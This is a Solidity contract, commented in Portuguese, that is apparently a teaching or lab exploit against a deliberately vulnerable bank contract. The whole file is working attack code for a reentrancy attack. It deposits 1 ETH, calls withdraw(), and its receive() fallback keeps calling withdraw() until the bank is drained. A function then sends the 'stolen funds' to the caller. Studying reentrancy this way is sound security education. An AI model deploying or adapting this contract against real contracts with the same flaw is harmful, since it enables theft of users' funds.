// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public bank;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    // Função para iniciar o ataque
    function attack() external payable {
        // 1. Deposita 1 ETH no banco (para ter saldo)
        bank.deposit{value: 1 ether}();
        
        // 2. Chama a função de saque
        bank.withdraw();
    }

    // Esta função é chamada automaticamente quando o contrato recebe ETH
    // É aqui que a "mágica" da reentrância acontece.
    receive() external payable {
        // Se o banco ainda tiver dinheiro, chama withdraw() novamente
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    // Função para o atacante sacar o dinheiro roubado
    function getStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}